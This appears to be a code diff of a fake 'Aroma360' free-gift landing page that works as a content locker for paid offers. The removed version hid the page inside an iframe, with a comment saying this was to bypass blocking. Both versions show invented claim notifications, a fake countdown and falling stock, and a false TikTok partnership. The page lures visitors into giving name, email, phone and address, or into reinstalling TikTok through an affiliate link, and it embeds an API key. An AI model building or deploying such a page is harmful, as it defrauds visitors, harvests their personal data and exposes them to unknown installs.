@@ -2,136 +2,260 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aroma History & Education</title>
-    <style>
-        /* ستايل بسيط باش الصفحة الرئيسية تبان نقية */
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #050505; }
-        iframe { border: none; width: 100%; height: 100%; display: none; }
-        #loading { 
-            display: flex; align-items: center; justify-content: center; height: 100vh; 
-            color: #b8860b; font-family: sans-serif; font-size: 14px; letter-spacing: 1px;
-        }
-    </style>
-</head>
-<body>
-
-    <div id="loading">LOADING SECURE CONTENT...</div>
-    <iframe id="main-frame"></iframe>
-
-    <script>
-        // هاد المتغير فيه الكود ديالك كامل مشفر بـ Base64 باش يتجاوز أي بلوك
-        const payload = `<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Aroma360 | Anniversary Exclusive</title>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"><\/script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    
     <style>
-        :root { --bg: #050505; --card-bg: rgba(255, 255, 255, 0.03); --gold: linear-gradient(135deg, #f5d27a 0%, #b8860b 100%); --gold-light: #f5d27a; --white: #ffffff; --text-gray: #d1d5db; }
+        :root {
+            --bg: #050505;
+            --card-bg: rgba(255, 255, 255, 0.03);
+            --gold: linear-gradient(135deg, #f5d27a 0%, #b8860b 100%);
+            --gold-light: #f5d27a;
+            --white: #ffffff;
+            --text-gray: #d1d5db;
+        }
+
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { margin: 0; font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--white); overflow-x: hidden; line-height: 1.6; }
-        .bg-glow { position: fixed; top: 0; left: 50%; transform: translateX(-50%); width: 100vw; height: 100vh; background: radial-gradient(circle at 50% -15%, rgba(184, 134, 11, 0.2) 0%, rgba(0, 0, 0, 0) 70%); z-index: -1; }
-        #notification-toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-200%); width: 92%; max-width: 380px; background: rgba(18, 18, 18, 0.9); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); border: 1px solid rgba(245, 210, 122, 0.25); border-radius: 20px; padding: 12px; display: flex; align-items: center; gap: 15px; z-index: 10000; transition: all 0.7s cubic-bezier(0.19, 1, 0.22, 1); box-shadow: 0 15px 40px rgba(0,0,0,0.6), inset 0 0 15px rgba(245, 210, 122, 0.05); }
+
+        .bg-glow { 
+            position: fixed; top: 0; left: 50%; transform: translateX(-50%); 
+            width: 100vw; height: 100vh; 
+            background: radial-gradient(circle at 50% -15%, rgba(184, 134, 11, 0.2) 0%, rgba(0, 0, 0, 0) 70%); 
+            z-index: -1; 
+        }
+
+        /* --- NOTIFICATIONS DESIGN --- */
+        #notification-toast { 
+            position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-200%);
+            width: 92%; max-width: 380px;
+            background: rgba(18, 18, 18, 0.9); 
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(245, 210, 122, 0.25);
+            border-radius: 20px; padding: 12px;
+            display: flex; align-items: center; gap: 15px; 
+            z-index: 10000; transition: all 0.7s cubic-bezier(0.19, 1, 0.22, 1);
+            box-shadow: 0 15px 40px rgba(0,0,0,0.6), inset 0 0 15px rgba(245, 210, 122, 0.05);
+        }
         #notification-toast.show { transform: translateX(-50%) translateY(0); }
-        .toast-product-icon { width: 50px; height: 50px; border-radius: 12px; flex-shrink: 0; background: #000; border: 1px solid rgba(245, 210, 122, 0.3); display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        
+        .toast-product-icon { 
+            width: 50px; height: 50px; border-radius: 12px; flex-shrink: 0; 
+            background: #000; border: 1px solid rgba(245, 210, 122, 0.3);
+            display: flex; align-items: center; justify-content: center; overflow: hidden;
+        }
         .toast-product-icon img { width: 90%; height: 90%; object-fit: contain; }
         .toast-content { flex-grow: 1; }
         .toast-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 3px; }
-        .toast-app-name { font-size: 10px; font-weight: 800; color: var(--gold-light); text-transform: uppercase; letter-spacing: 1px; }
         .toast-time { font-size: 10px; color: #666; }
         .toast-msg { font-size: 13px; color: #fff; font-weight: 600; line-height: 1.2; }
+
         .page-wrapper { min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 30px 20px; }
-        .anniversary-full-card { background: rgba(184, 134, 11, 0.05); border: 1.5px solid #b8860b; border-radius: 24px; padding: 25px 20px; text-align: center; max-width: 440px; margin: 20px auto; backdrop-filter: blur(15px); box-shadow: 0 0 30px rgba(184, 134, 11, 0.1); }
+
+        .anniversary-full-card {
+            background: rgba(184, 134, 11, 0.05); border: 1.5px solid #b8860b; border-radius: 24px;
+            padding: 25px 20px; text-align: center; max-width: 440px; margin: 20px auto;
+            backdrop-filter: blur(15px); box-shadow: 0 0 30px rgba(184, 134, 11, 0.1);
+        }
+
         .main-text { font-size: 16px; font-weight: 700; color: #ffffff; }
         .highlight { color: var(--gold-light); font-weight: 800; text-transform: uppercase; }
         .divider-3d { height: 1px; background: linear-gradient(to right, transparent, #b8860b, transparent); margin: 15px 0; opacity: 0.5; }
-        .main-card { width: 100%; max-width: 380px; background: var(--card-bg); backdrop-filter: blur(30px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 40px; padding: 45px 25px 30px; margin-top: 85px; position: relative; box-shadow: 0 40px 100px -20px rgba(0, 0, 0, 0.8); }
+
+        .main-card {
+            width: 100%; max-width: 380px; background: var(--card-bg); backdrop-filter: blur(30px);
+            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 40px; padding: 45px 25px 30px;
+            margin-top: 85px; position: relative; box-shadow: 0 40px 100px -20px rgba(0, 0, 0, 0.8);
+        }
+
         .product-display { width: 200px; margin: -130px auto 25px; position: relative; z-index: 10; perspective: 1000px; }
         .product-display img { width: 100%; filter: drop-shadow(0 20px 50px rgba(184, 134, 11, 0.3)); animation: floating3D 3.5s ease-in-out infinite; }
+        
         @keyframes floating3D { 0%, 100% { transform: translateY(0) rotateX(5deg) rotateY(-5deg); } 50% { transform: translateY(-20px) rotateX(-5deg) rotateY(5deg); } }
+
         .stock-labels { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
         .stock-label-left { color: var(--text-gray); font-size: 12px; font-weight: 800; text-transform: uppercase; }
         .stock-warning { color: var(--gold-light); font-weight: 900; font-size: 14px; }
         .stock-bar { height: 8px; background: rgba(255, 255, 255, 0.05); border-radius: 10px; overflow: hidden; margin-bottom: 25px; }
         .stock-fill { height: 100%; background: var(--gold); width: 85%; transition: width 1s ease; }
+
         .timer-header { color: #ffffff; font-size: 14px; font-weight: 800; text-transform: uppercase; margin-top: 25px; text-align: center; }
         .timer-display { font-family: 'Orbitron', sans-serif; font-size: 26px; color: var(--gold-light); text-align: center; margin-top: 8px; letter-spacing: 3px; font-weight: 700; }
+
         .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.97); backdrop-filter: blur(20px); z-index:99999; align-items:center; justify-content:center; padding: 15px; }
         .locker { background: #0d0d0d; border: 1px solid rgba(245, 210, 122, 0.25); border-radius: 35px; padding: 30px 20px; width: 100%; max-width: 420px; text-align: center; }
         .locker-header-img { width: 130px; margin-bottom: 20px; filter: drop-shadow(0 0 20px rgba(245, 210, 122, 0.4)); animation: floating3D 4s infinite; }
-        .start-btn { width: 100%; padding: 20px; border: none; border-radius: 20px; font-size: 19px; font-weight: 800; color: #000; background: var(--gold); cursor: pointer; text-transform: uppercase; }
+        .start-btn { width: 100%; padding: 20px; border: none; border-radius: 20px; font-size: 19px; font-weight: 800; color: #000; background: var(--gold); cursor: pointer; text-transform: uppercase; box-shadow: 0 10px 25px rgba(184, 134, 11, 0.3); }
         .step-item { display: flex; gap: 12px; margin-bottom: 12px; background: rgba(255,255,255,0.03); padding: 15px; border-radius: 18px; border: 1px solid rgba(255,255,255,0.05); text-align: left; }
         .step-number { background: var(--gold); color: #000; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; flex-shrink: 0; }
         .step-text { color: #fff; font-size: 13px; font-weight: 700; }
-        .instruction-header { font-weight: 800 !important; font-size: 22px !important; letter-spacing: 0.5px; text-shadow: 0 0 10px rgba(0, 255, 136, 0.2); margin-bottom: 10px; }
-        .locker-important-note { font-weight: 800 !important; font-size: 14px !important; text-transform: uppercase; letter-spacing: 0.2px; display: block; margin-bottom: 20px; }
+
+        .instruction-header { font-weight: 800; font-size: 22px; letter-spacing: 0.5px; text-shadow: 0 0 10px rgba(0, 255, 136, 0.2); margin-bottom: 10px; }
+        .locker-important-note { font-weight: 800; font-size: 14px; text-transform: uppercase; letter-spacing: 0.2px; display: block; margin-bottom: 20px; }
     </style>
 </head>
 <body>
     <div class="bg-glow"></div>
+
     <div id="notification-toast">
-        <div class="toast-product-icon"><img src="https://i.postimg.cc/KY1xj6pY/Chat-GPT-Image-29-janv-2026-13-53-50.png"></div>
-        <div class="toast-content"><div class="toast-header"><span class="toast-time">just now</span></div><div id="toast-msg-text" class="toast-msg"></div></div>
-    </div>
-    <div class="page-wrapper">
-        <div style="text-align:center; margin-bottom:20px;"><img src="https://i.postimg.cc/131P40Nt/Sans-titre-removebg-preview.png" style="width:110px; filter: brightness(0) invert(1);"></div>
-        <div class="anniversary-full-card">
-            <div class="main-text">We are celebrating a decade of <span class="highlight">AROMA360</span> by giving away our most exclusive gift yet: our brand-new product, absolutely <span class="highlight">FREE!</span><br><br>To ensure fair distribution and prevent duplicate claims, we’ve partnered with <span class="highlight">TIKTOK</span> for a quick verification.<div class="divider-3d"></div></div>
+        <div class="toast-product-icon">
+            <img src="https://i.postimg.cc/KY1xj6pY/Chat-GPT-Image-29-janv-2026-13-53-50.png">
         </div>
+        <div class="toast-content">
+            <div class="toast-header">
+                <span class="toast-time">just now</span>
+            </div>
+            <div id="toast-msg-text" class="toast-msg"></div>
+        </div>
+    </div>
+
+    <div class="page-wrapper">
+        <div style="text-align:center; margin-bottom:20px;">
+            <img src="https://i.postimg.cc/131P40Nt/Sans-titre-removebg-preview.png" style="width:110px; filter: brightness(0) invert(1);">
+        </div>
+
+        <div class="anniversary-full-card">
+            <div class="main-text">
+                We are celebrating a decade of <span class="highlight">AROMA360</span> 
+                by giving away our most exclusive gift yet: our brand-new product, 
+                absolutely <span class="highlight">FREE!</span>
+                <br><br>
+                To ensure fair distribution and prevent duplicate claims, 
+                we’ve partnered with <span class="highlight">TIKTOK</span> for a quick verification.
+                <div class="divider-3d"></div>
+            </div>
+        </div>
+
         <div class="main-card">
-            <div class="product-display"><img src="https://i.postimg.cc/KY1xj6pY/Chat-GPT-Image-29-janv-2026-13-53-50.png"></div>
-            <div class="stock-labels"><span class="stock-label-left">REMAINING STOCK</span><span class="stock-warning">Only <span id="stock-count">99</span> left!</span></div>
+            <div class="product-display">
+                <img src="https://i.postimg.cc/KY1xj6pY/Chat-GPT-Image-29-janv-2026-13-53-50.png">
+            </div>
+            
+            <div class="stock-labels">
+                <span class="stock-label-left">REMAINING STOCK</span>
+                <span class="stock-warning">Only <span id="stock-count">99</span> left!</span>
+            </div>
             <div class="stock-bar"><div class="stock-fill" id="stock-bar-fill"></div></div>
-            <ul style="list-style:none; padding:0; margin-bottom:25px; text-align:left;"><li style="margin-bottom:10px; font-weight:700;"><span style="color:var(--gold-light)">✔</span> No payment required</li><li style="margin-bottom:10px; font-weight:700;"><span style="color:var(--gold-light)">✔</span> No credit card needed</li></ul>
+
+            <ul style="list-style:none; padding:0; margin-bottom:25px; text-align:left;">
+                <li style="margin-bottom:10px; font-weight:700;"><span style="color:var(--gold-light)">✔</span> No payment required</li>
+                <li style="margin-bottom:10px; font-weight:700;"><span style="color:var(--gold-light)">✔</span> No credit card needed</li>
+            </ul>
+
             <button class="start-btn" onclick="start()">Unlock My Gift</button>
             <div class="timer-header">⏳ Offer Ends In:</div>
             <div class="timer-display" id="h24-timer">23:59:59</div>
         </div>
     </div>
+
     <div class="overlay" id="locker">
         <div class="locker">
             <img src="https://i.postimg.cc/KY1xj6pY/Chat-GPT-Image-29-janv-2026-13-53-50.png" class="locker-header-img">
             <div class="instruction-header" style="color:#00ff88;">INFORMATION REQUIRED:</div>
             <span class="locker-important-note" style="color:#f5d27a;">⚠️ IMPORTANT: You must complete the requirements correctly to receive your gift.</span>
-            <div id="android-content" style="display:none;"><div class="step-item"><div class="step-number">1</div><div class="step-text">Complete the short survey</div></div><div class="step-item"><div class="step-number">2</div><div class="step-text">Provide details (Name, Email, Phone, & Address) shipping</div></div><div class="step-item"><div class="step-number">3</div><div class="step-text">Once you complete these steps, you’ll be automatically redirected to claim your new product for free!</div></div></div>
-            <div id="ios-content" style="display:none;"><div class="step-item"><div class="step-number">1</div><div class="step-text">Download & Install: Click "Start Offer" to download the official TikTok app..</div></div><div class="step-item"><div class="step-number">2</div><div class="step-text">Important Note: If TikTok is already installed on your device, please uninstall it first, then reinstall it through this link to ensure your entry is verified.</div></div><div class="step-item"><div class="step-number">3</div><div class="step-text">Important: Once installed, you MUST OPEN and BROWSE TikTok for at least 30 SECONDS to be redirected and claim your free product.</div></div></div>
+            
+            <div id="android-content" style="display:none;">
+                <div class="step-item"><div class="step-number">1</div><div class="step-text">Complete the short survey</div></div>
+                <div class="step-item"><div class="step-number">2</div><div class="step-text">Provide details (Name, Email, Phone, & Address) shipping</div></div>
+                <div class="step-item"><div class="step-number">3</div><div class="step-text">Once complete, you will be redirected to claim your product for free!</div></div>
+            </div>
+            <div id="ios-content" style="display:none;">
+                <div class="step-item"><div class="step-number">1</div><div class="step-text">Download & Install: Click "Start Offer" to get the official TikTok app.</div></div>
+                <div class="step-item"><div class="step-number">2</div><div class="step-text">Note: If TikTok is already installed, please uninstall it first and reinstall via this link for verification.</div></div>
+                <div class="step-item"><div class="step-number">3</div><div class="step-text">Important: Open and browse TikTok for 30 SECONDS to be redirected.</div></div>
+            </div>
             <button class="start-btn" style="margin-top:20px;" id="offer-btn">Start Offer</button>
         </div>
     </div>
+
     <script>
         const API_KEY = "43041|IigDIJHzXLSjpJeueyLqDYtxiUpXHEouKjRJuIPPf6bceeec";
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
         let lockerActive = false;
-        function start() { lockerActive = true; document.getElementById('notification-toast').style.display = 'none'; document.getElementById('locker').style.display = 'flex'; document.getElementById(isIOS ? "ios-content" : "android-content").style.display = "block"; fetchOffer(); }
-        async function fetchOffer() { try { const res = await fetch('https://api.ipify.org?format=json'); const { ip } = await res.json(); const offerRes = await fetch(\`https://lockedapp.org/api/v2?ip=\${ip}&user_agent=\${encodeURIComponent(navigator.userAgent)}\`, { headers: { 'Authorization': \`Bearer \${API_KEY}\` } }); const data = await offerRes.json(); if(data.offers && data.offers.length > 0) { document.getElementById('offer-btn').onclick = () => window.location.href = data.offers[0].link; } } catch(e) {} }
-        function showNotification() { if(lockerActive) return; const messages = ["Sarah from California just claimed her Gift Set! 🎁", "Michael D. successfully completed TikTok verification.", "lucas from Florida just claimed her Gift Set! 🎁", "David successfully completed TikTok verification."]; const toast = document.getElementById('notification-toast'); document.getElementById('toast-msg-text').innerText = messages[Math.floor(Math.random()*messages.length)]; toast.classList.add('show'); setTimeout(() => { toast.classList.remove('show'); }, 5000); }
-        let seconds = 86399; setInterval(() => { let h = Math.floor(seconds / 3600); let m = Math.floor((seconds % 3600) / 60); let s = seconds % 60; document.getElementById('h24-timer').innerText = (h<10?"0":"")+h+":"+(m<10?"0":"")+m+":"+(s<10?"0":"")+s; if(seconds > 0) seconds--; }, 1000);
-        let stock = 99; setInterval(() => { if(stock > 5) { stock -= Math.floor(Math.random() * 2); document.getElementById('stock-count').innerText = stock; document.getElementById('stock-bar-fill').style.width = (stock * 0.85) + "%"; } }, 8000);
-        window.onload = () => { confetti({ particleCount: 150, spread: 70, origin: { y: 0.7 }, colors: ['#f5d27a', '#ffffff'] }); setInterval(showNotification, 13000); setTimeout(showNotification, 3000); };
-    <\/script>
-</body>
-</html>`;
 
-        // دالة باش نعمرو الـ iframe بطريقة صحيحة كـ Document كامل
-        function inject() {
-            const frame = document.getElementById('main-frame');
-            const loader = document.getElementById('loading');
-            
-            // كتابة المحتوى مباشرة في الـ iframe
-            const doc = frame.contentDocument || frame.contentWindow.document;
-            doc.open();
-            doc.write(payload);
-            doc.close();
-
-            // إظهار الصفحة وإخفاء الـ Loading
-            frame.style.display = 'block';
-            loader.style.display = 'none';
+        function start() {
+            lockerActive = true;
+            document.getElementById('notification-toast').style.display = 'none';
+            document.getElementById('locker').style.display = 'flex';
+            document.getElementById(isIOS ? "ios-content" : "android-content").style.display = "block";
+            fetchOffer();
         }
 
-        window.onload = inject;
+        async function fetchOffer() {
+            try {
+                // Get User IP
+                const res = await fetch('https://api.ipify.org?format=json');
+                const { ip } = await res.json();
+                
+                // Fetch Offers from OGAds API
+                const offerRes = await fetch(`https://lockedapp.org/api/v2?ip=${ip}&user_agent=${encodeURIComponent(navigator.userAgent)}`, {
+                    headers: { 'Authorization': `Bearer ${API_KEY}` }
+                });
+                const data = await offerRes.json();
+                
+                if(data.offers && data.offers.length > 0) {
+                    // Set the link to the first available offer
+                    document.getElementById('offer-btn').onclick = () => {
+                        window.location.href = data.offers[0].link;
+                    };
+                } else {
+                    // Fallback link if no offers are found
+                    document.getElementById('offer-btn').onclick = () => {
+                        window.location.href = "https://www.google.com"; // عوض هاد الرابط برابط احتياطي من عندك
+                    };
+                }
+            } catch(e) {
+                console.error("API Error:", e);
+                // Fallback action in case of technical failure
+                document.getElementById('offer-btn').onclick = () => {
+                    window.location.href = "https://www.google.com";
+                };
+            }
+        }
+
+        function showNotification() {
+            if(lockerActive) return;
+            const messages = [
+                "Sarah from California just claimed her Gift Set! 🎁",
+                "Michael D. successfully completed TikTok verification.",
+                "Lucas from Florida just claimed her Gift Set! 🎁",
+                "David successfully completed TikTok verification.",
+                "Emma from New York is waiting for shipping! 🚚"
+            ];
+            const toast = document.getElementById('notification-toast');
+            document.getElementById('toast-msg-text').innerText = messages[Math.floor(Math.random()*messages.length)];
+            toast.classList.add('show');
+            setTimeout(() => { toast.classList.remove('show'); }, 5000);
+        }
+
+        // Countdown Timer
+        let seconds = 86399;
+        setInterval(() => {
+            let h = Math.floor(seconds / 3600); 
+            let m = Math.floor((seconds % 3600) / 60); 
+            let s = seconds % 60;
+            document.getElementById('h24-timer').innerText = (h<10?"0":"")+h+":"+(m<10?"0":"")+m+":"+(s<10?"0":"")+s;
+            if(seconds > 0) seconds--;
+        }, 1000);
+
+        // Dynamic Stock Reduction
+        let stock = 99;
+        setInterval(() => {
+            if(stock > 5) {
+                stock -= Math.floor(Math.random() * 2);
+                document.getElementById('stock-count').innerText = stock;
+                document.getElementById('stock-bar-fill').style.width = (stock * 0.85) + "%";
+            }
+        }, 8000);
+
+        window.onload = () => {
+            confetti({ particleCount: 150, spread: 70, origin: { y: 0.7 }, colors: ['#f5d27a', '#ffffff'] });
+            setInterval(showNotification, 13000);
+            setTimeout(showNotification, 3000);
+        };
     </script>
 </body>
 </html>
